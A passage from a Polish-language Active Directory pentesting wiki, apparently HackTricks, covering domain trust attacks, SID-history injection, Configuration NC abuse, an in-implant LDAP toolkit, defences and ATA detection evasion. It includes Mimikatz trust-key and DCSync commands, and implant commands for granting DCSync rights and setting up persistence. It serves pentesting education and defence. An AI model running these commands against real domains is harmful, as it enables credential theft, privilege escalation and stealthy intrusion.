[Dowiedz się, czym jest SSP (Security Support Provider) tutaj.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własne **SSP**, aby **capture** w **clear text** **credentials** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **push attributes** (SIDHistory, SPNs...) na wybranych obiektach **bez** pozostawiania jakichkolwiek **logs** dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i być wewnątrz **root domain**.\
Zauważ, że jeśli użyjesz złych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omawialiśmy, jak eskalować uprawnienia, jeśli masz **enough permission to read LAPS passwords**. Jednak te hasła mogą być również użyte do **maintain persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft postrzega **Forest** jako granicę bezpieczeństwa. To oznacza, że **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domain** dostęp do zasobów w innej **domain**. Tworzy on powiązanie między systemami uwierzytelniania obu domen, pozwalając na płynny przepływ weryfikacji uwierzytelnienia. Kiedy domeny ustanawiają trust, wymieniają i przechowują określone **keys** w swoich **Domain Controllers (DCs)**, które są kluczowe dla integralności trustu.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, musi najpierw poprosić o specjalny ticket znany jako **inter-realm TGT** z DC swojej domeny. Ten TGT jest szyfrowany wspólnym **key**, na którym obie domeny się zgodziły. Użytkownik następnie przedstawia ten TGT **DC of the trusted domain**, aby otrzymać ticket serwisowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC zaufanej domeny, wydaje ona TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer klienta w **Domain 1** zaczyna proces używając swojego **NTLM hash** do zażądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT jeśli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie prosi o **inter-realm TGT** od DC1, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany **trust key** współdzielonym między DC1 i DC2 jako część dwukierunkowego trustu domen.
5. Klient zabiera inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 weryfikuje inter-realm TGT używając wspólnego trust key i, jeśli jest ważny, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Na końcu klient przedstawia ten TGS serwerowi, który jest szyfrowany z hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Different trusts

Ważne jest zauważyć, że **a trust can be 1 way or 2 ways**. W opcji 2-way, obie domeny będą sobie ufać, ale w relacji **1 way** jedna z domen będzie **trusted**, a druga **trusting**. W tym ostatnim przypadku **będziesz w stanie uzyskać dostęp tylko do zasobów wewnątrz trusting domain z trusted domain**.

Jeśli Domain A ufa Domain B, A jest domeną trusting, a B jest trusted. Co więcej, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: To częste ustawienie w obrębie tego samego forest, gdzie child domain automatycznie ma dwukierunkowy trust tranzystywny z domeną nadrzędną. Oznacza to, że żądania uwierzytelnienia mogą swobodnie przepływać między parent i child.
- **Cross-link Trusts**: Nazywane też "shortcut trusts", są ustanawiane między child domains aby przyspieszyć procesy referral. W złożonych lasach referencje uwierzytelniania zwykle muszą podróżować do root lasu, a potem w dół do domeny docelowej. Tworząc cross-links, skraca się trasę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Ustanawiane między różnymi, niezależnymi domenami i z natury są non-transitive. Według [dokumentacji Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są przydatne do uzyskiwania dostępu do zasobów w domenie poza aktualnym forest, która nie jest połączona przez forest trust. Bezpieczeństwo jest wzmacniane przez SID filtering przy external trusts.
- **Tree-root Trusts**: Te trusty są automatycznie ustanawiane między forest root domain a nowo dodanym tree root. Chociaż nie są często spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domen do lasu, pozwalając im zachować unikalną nazwę domeny i zapewniając dwukierunkową transytywność. Więcej informacji w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu to dwukierunkowy transytywny trust pomiędzy dwoma forest root domains, również wymuszający SID filtering w celu zwiększenia zabezpieczeń.
- **MIT Trusts**: Te trusty są ustanawiane z nie-Windowsowymi, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i przeznaczone do integracji z systemami opartymi na Kerberos spoza ekosystemu Windows.

#### Inne różnice w **trusting relationships**

- Relacja zaufania może być także **transitive** (A ufa B, B ufa C, wtedy A ufa C) lub **non-transitive**.
- Relacja zaufania może być ustawiona jako **bidirectional trust** (obie ufają sobie) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Attack Path

1. **Enumerate** relacje zaufania
2. Sprawdź, czy jakikolwiek **security principal** (user/group/computer) ma **access** do zasobów **other domain**, może przez wpisy ACE lub przez przynależność do grup innej domeny. Szukaj **relationships across domains** (prawdopodobnie trust został stworzony z tego powodu).
1. kerberoast w tym przypadku może być inną opcją.
3. **Compromise** konta, które mogą **pivot** przez domeny.

Atakujący mogą mieć dostęp do zasobów w innej domenie poprzez trzy główne mechanizmy:

- **Local Group Membership**: Principals mogą być dodani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, dając im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą też być członkami grup w domenie zewnętrznej. Jednak skuteczność tej metody zależy od natury trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być wyspecyfikowani w **ACL**, szczególnie jako jednostki w **ACEs** w **DACL**, dając im dostęp do określonych zasobów. Dla tych, którzy chcą zagłębić się w mechanikę ACLs, DACLs i ACEs, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” jest nieocenionym źródłem.

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** aby znaleźć foreign security principals w domenie. Będą to user/group z **an external domain/forest**.

Możesz to sprawdzić w **Bloodhound** lub używając **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumeracji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**, jeden dla _Child --> Parent_ i drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, który jest używany przez bieżącą domenę, używając:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Zeskaluj uprawnienia do Enterprise admin w domenie child/parent, wykorzystując zaufanie przez SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, jak można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC pełni rolę centralnego repozytorium danych konfiguracyjnych w całym lesie Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, a zapisywalne DC przechowują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o wszystkich site'ach komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą powiązać GPO z root DC sites. Ta akcja może potencjalnie skompromitować domenę root przez modyfikowanie zasad stosowanych do tych site'ów.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jednym wektorem ataku jest celowanie w uprzywilejowane gMSA w domenie. Klucz KDS Root, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do klucza KDS Root i obliczyć hasła dla dowolnego gMSA w całym lesie.

Szczegółowa analiza i instrukcje krok po kroku dostępne są w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowane MSA (BadSuccessor – nadużywanie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe badania zewnętrzne: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na tworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu i kontroli nad nowo tworzonymi obiektami AD.

Dalsza lektura: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Vulnerabilność ADCS ESC5 polega na przejęciu kontroli nad obiektami Public Key Infrastructure (PKI) w celu stworzenia szablonu certyfikatu, który umożliwia uwierzytelnianie się jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego child DC umożliwia wykonanie ataku ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). W scenariuszach bez ADCS atakujący może skonfigurować niezbędne komponenty, jak omówiono w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **your domain is trusted** przez external one, co daje ci **undetermined permissions** względem niego. Będziesz musiał ustalić, **which principals of your domain have which access over the external domain**, a następnie spróbować to exploit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzny Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** **ufnie przekazuje** pewne **uprawnienia** podmiotowi z **innej domeny**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, domena zaufana **tworzy użytkownika** o **przewidywalnej nazwie**, który używa jako **hasła hasła zaufania**. Co oznacza, że możliwe jest **uzyskać dostęp jako użytkownik z domeny ufającej do domeny zaufanej** aby ją zenumerować i spróbować eskalować uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem skompromitowania domeny zaufanej jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** zaufania domeny (co nie jest zbyt częste).

Kolejnym sposobem skompromitowania domeny zaufanej jest pozostanie na maszynie, do której **użytkownik z domeny zaufanej może się zalogować** przez **RDP**. Następnie atakujący może wstrzyknąć kod w proces sesji RDP i stamtąd **dostać się do domeny źródłowej ofiary**.\
Ponadto, jeśli **ofiara podmontowała swój dysk twardy**, z procesu **sesji RDP** atakujący może umieścić **backdoors** w **folderze autostartu dysku twardego**. Technika ta nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie nadużyć zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach zaufania między forestami jest łagodzone przez SID Filtering, które jest domyślnie aktywowane na wszystkich inter-forest trusts. Jest to oparte na założeniu, że intra-forest trusts są bezpieczne, traktując forest, a nie domenę, jako granicę bezpieczeństwa zgodnie ze stanowiskiem Microsofta.
- Jest jednak haczyk: SID Filtering może zakłócać działanie aplikacji i dostęp użytkowników, co czasami prowadzi do jego dezaktywacji.

### **Selective Authentication:**

- W przypadku inter-forest trusts zastosowanie Selective Authentication powoduje, że użytkownicy z dwóch forestów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w obrębie domeny lub forestu ufającego.
- Należy pamiętać, że te środki nie zabezpieczają przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Nadużycia AD oparte na LDAP z implantów on-host

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje bloodyAD-style LDAP primitives jako x64 Beacon Object Files, które działają w całości wewnątrz implantu na hoście (np. Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch korzysta z bieżącego kontekstu bezpieczeństwa logowania po LDAP (389) z signing/sealing lub LDAPS (636) z automatycznym zaufaniem do certyfikatu, więc nie są wymagane socks proxies ani artefakty na dysku.

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadane forest/domain z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` ujawniają roasting candidates, ustawienia delegacji oraz istniejące [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskryptory bezpośrednio z LDAP.
- `get-acl` i `get-writable --detailed` parsują DACL, aby wypisać trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) oraz dziedziczenie, dostarczając natychmiastowych celów do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowych principalów lub konta maszyn wszędzie tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` bezpośrednio przejmują cele, gdy znalezione zostaną rights typu write-property.
- Komendy skoncentrowane na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekładają WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub przywileje DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegacja, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego usera Kerberoastable; `add-asreproastable` (UAC toggle) oznacza go do AS-REP roasting bez zmiany hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do SID history kontrolowanego principal’a (patrz [SID-History Injection](sid-history-injection.md)), zapewniając ukrytą inherencję dostępu całkowicie przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, w których już istnieją delegowane prawa, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Dokładnie ograniczone komendy usuwające (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybki rollback po zebraniu poświadczeń lub ustanowieniu persistence, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych środków obronnych

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md)

### **Środki obronne dla ochrony poświadczeń**

- **Domain Admins Restrictions**: Zaleca się, aby Domain Admins mogli logować się tylko do Domain Controllers, unikając korzystania z nich na innych hostach.
- **Service Account Privileges**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Temporal Privilege Limitation**: Dla zadań wymagających uprawnień DA, czas ich trwania powinien być ograniczony. Można to osiągnąć przy pomocy: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audytuj Event ID 2889/3074/3075, a następnie egzekwuj LDAP signing oraz LDAPS channel binding na DC/klientach, aby zablokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Wdrażanie technik deception**

- Wdrażanie deception polega na ustawianiu pułapek, takich jak decoy users lub computers, z cechami takimi jak hasła, które nigdy nie wygasają, lub oznaczeniem Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi prawami lub dodawanie ich do wysoko uprzywilejowanych grup.
- Praktyczny przykład wykorzystuje narzędzia takie jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej o wdrażaniu technik deception znajdziesz na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Wykrywanie technik deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowe ObjectSID, rzadkie logowania, daty utworzenia oraz niskie liczby nieudanych prób logowania.
- **Ogólne wskaźniki**: Porównywanie atrybutów potencjalnych decoy obiektów z prawdziwymi może ujawnić niezgodności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikacji takich deception.

### **Omijanie systemów wykrywania**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga unikać wykrycia przez nieobniżanie do NTLM.
- **DCSync Attacks**: Wykonywanie z nie-Domain Controller, aby uniknąć wykrycia przez ATA, jest zalecane, ponieważ bezpośrednie wykonanie na Domain Controller wywoła alerty.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
